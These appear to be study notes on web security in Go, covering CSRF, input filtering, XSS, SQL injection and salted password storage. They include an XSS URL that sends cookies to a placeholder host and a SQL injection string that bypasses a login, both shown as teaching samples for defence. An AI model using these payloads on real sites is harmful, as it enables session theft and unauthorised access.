# 9 Security-and-encryption

## 9.1 CSRF attacks

### What is CSRF?

CSRF:Cross-site request forgery (跨站請求偽造)

![](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/images/9.1.csrf.png?raw=true)

Figure 9.1 CSRF attacks process.

You can't guarantee that the following does not occur:
- May forget to close.
- Can't guarantee cookies is expired.
- High traffic website which have bug will easily get attack by CSRF.

### How to prevent CSRF attacks

Most approaches stem:
1. Maintaining proper use of `GET`, `POST` and `cookies`
2. Including a pseudo-random number (like uni-token) with non-GET requests.


## 9.2 Filtering inputs

Filtering data is divided into three steps:
1. identify the data: filter data to figure out where it from.
2. filter data: know what kind of data we have received.
3. distinguish between filtered and tainted data.

### Identifying data

Easy to recognize `GET` && `POST` data by using such as `r.ParseForm`

### Filtering data
It's very important NOT to make any attempts at correcting the illegal data.

Use Third party package to filter is a easy way.

### Distinguishing between filtered and tainted data

Filtered data -> Global Map names `CleanMap`
- Each request must initialize `CleanMap` as an empty map.
- Prevent confilct of external `CleanMap`.


## 9.3 XSS attacks

XSS: Cross Site Scripting (跨站腳本攻擊) 

### What is XSS attack

- Store XSS attack
    - The attacker's script then  executes arbitrary code on the client's computer.
- Reflect XSS attack
    - Add \<html...\> code into requeset.

### XSS principles

Normal url: `http://127.0.0.1/?name=linonon`

Tainted url: `http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;`

Danger url: `http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;`, this will send cookie to `www.xxx.com`


### How to prevent XSS

- Filter special characters
    - packge in Go: `text/template`: `HTMLEscapeString` && `JSEscapeString`
- Specify the content type in your HTTP headers
`w.Header().Set("Content-Type", "text/javascript")`

This allows client browsers to parse the response as javascript code (applying the neccessary filters) instead o rendering the content in an unspecified and potentially dangerous manner.


## 9.4 SQL injection

sql:
```go
sql := "SELECT * FROM user WHERE username='"+username+"' AND password='"+password+"'"`
```

injected sql
```go
// if username = "myuser' or 'foo' = 'foo' --"
sql-> SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx' 
```

### How to prevent SQL injection

1. Strictly limit permissions for database operation so users only have minimum set of permissions required to accomplish their work.
2. Check that input data has the expected data format, and strictly limit the type of variable that can be submitted by `regexp` or `strconv`.
3. Transcode or escape from pair of special characters by `text/template`'s `HTMLEscapeString`
4. Don't concatenating user input variable in embedded SQL statements.
5. Use such as `sqlmap`, `SQLninja` to detecting SQL injection vulnerabilities and repair them.
6. Avoid printing SQL error information on public webpages.

## 9.5 Password storage

### Bad solution

Use "one-way hashing".

"one-way hashing" algorithm include SHA-256, SHA-1, MD5.

hacker can use `rainbow table`

### Good solution

Add `salt`(like `token` or variable such as `username` to hashmap) after data string, then do hashmap.

### Pro solution

```go
dk := scrypt.Key([]byte("some password"), []byte(salt), 16384, 8, 1, 32)
```